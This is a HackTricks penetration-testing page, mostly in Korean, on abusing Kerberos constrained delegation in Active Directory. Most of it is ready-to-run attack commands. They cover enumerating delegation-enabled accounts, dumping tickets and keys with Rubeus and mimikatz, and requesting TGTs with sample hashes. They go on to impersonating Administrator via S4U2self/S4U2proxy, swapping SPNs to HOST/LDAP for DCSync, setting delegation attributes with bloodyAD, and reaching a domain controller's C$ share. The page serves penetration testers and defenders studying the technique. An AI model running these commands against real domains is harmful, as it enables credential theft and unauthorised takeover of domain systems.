# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

이를 사용하면 Domain admin은 컴퓨터가 특정 머신의 임의의 **service**에 대해 사용자나 컴퓨터를 **가장(impersonate)** 하도록 **허용할 수 있습니다**.

- **Service for User to self (_S4U2self_):** 만약 **service account**가 _userAccountControl_ 값으로 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)을 포함하고 있으면, 해당 계정은 어떤 다른 사용자를 대신하여 자신(서비스)에 대한 TGS를 획득할 수 있습니다.
- **Service for User to Proxy(_S4U2proxy_):** **service account**는 **msDS-AllowedToDelegateTo**에 설정된 서비스에 대해 어떤 사용자를 대신하여 TGS를 얻을 수 있습니다. 이를 위해 먼저 그 사용자로부터 자신에게 대한 TGS가 필요하지만, 다른 TGS를 요청하기 전에 S4U2self를 사용해 해당 TGS를 얻을 수 있습니다.

**참고**: AD에서 사용자가 ‘_Account is sensitive and cannot be delegated_ ’로 표시되어 있으면, 해당 사용자를 **가장할 수 없습니다**.

이는 만약 서비스의 **hash를 탈취(compromise the hash of the service)** 하면, 사용자들을 **가장(impersonate)** 하여 표시된 머신들에 있는 어떤 **service**에 대해서도 그들을 대신해 **access**를 얻을 수 있음을 의미합니다(잠재적 **privesc**).

또한, 사용자가 가장할 수 있는 특정 service에만 접근하는 것이 아니라 임의의 service에도 접근할 수 있습니다. 그 이유는 SPN(요청된 서비스 이름)이 검증되지 않기 때문이며(티켓에서 이 부분은 암호화/서명되지 않음), 예를 들어 CIFS service에 접근할 수 있다면 Rubeus의 `/altservice` 플래그를 사용해 HOST service에도 접근할 수 있습니다. 동일한 SPN 교체 취약점은 Impacket getST -altservice 및 다른 도구들에 의해 악용됩니다.

또한 **DC에서의 LDAP service access**는 **DCSync**를 악용하는 데 필요한 것입니다.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2** 이후 KDC는 S4U2Proxy 확장을 통해 **constrained delegation across domains/forests**를 지원합니다. 최신 빌드(Windows Server 2016–2025)는 이 동작을 유지하며 프로토콜 전환을 알리기 위해 두 개의 PAC SIDs를 추가합니다:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) when the user authenticated normally.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) when a service asserted the identity through protocol transition.

프로토콜 전환이 도메인 간에 사용될 때 PAC 안에서 `SERVICE_ASSERTED_IDENTITY`가 포함되는 것을 기대하세요. 이는 S4U2Proxy 단계가 성공했음을 확인시켜 줍니다.

### Impacket / Linux tooling (altservice & full S4U)

최근 Impacket (0.11.x+)은 Rubeus와 동일한 S4U 체인 및 SPN swapping을 노출합니다:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
사용자 ST를 먼저 위조하는 것을 선호한다면(예: 오프라인 해시만 있는 경우), S4U2Proxy에 대해 **ticketer.py**를 **getST.py**와 함께 사용하세요. 현재의 특이사항(위조된 ST가 SPN key와 일치하지 않을 때 발생하는 **KRB_AP_ERR_MODIFIED** 등)은 열린 **Impacket issue #1713**을 참조하세요.

### 저권한 크레덴셜에서 delegation 설정 자동화

이미 컴퓨터나 서비스 계정에 대해 **GenericAll/WriteDACL** 권한을 보유하고 있다면, **RSAT** 없이 **bloodyAD (2024+)**를 사용해 필요한 속성들을 원격으로 푸시할 수 있습니다:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
이렇게 하면 해당 속성들을 쓸 수 있게 되는 즉시 DA 권한 없이도 privesc를 위한 constrained delegation 경로를 구성할 수 있습니다.

- 1단계: **허용된 서비스의 TGT 획득**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 컴퓨터에서 SYSTEM 권한이 아니어도 Printer Bug, unconstrain delegation, NTLM relaying 및 Active Directory Certificate Service abuse 같은 방법으로 TGT ticket이나 RC4 또는 AES256을 얻을 수 있는 다른 방법들이 있습니다
>
> **해당 TGT ticket(또는 해시)만 가지고 있어도 전체 컴퓨터를 침해하지 않고 이 공격을 수행할 수 있습니다.**

- 단계2: **사용자를 가장하여 서비스의 TGS를 얻습니다**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 및 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 참고자료
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
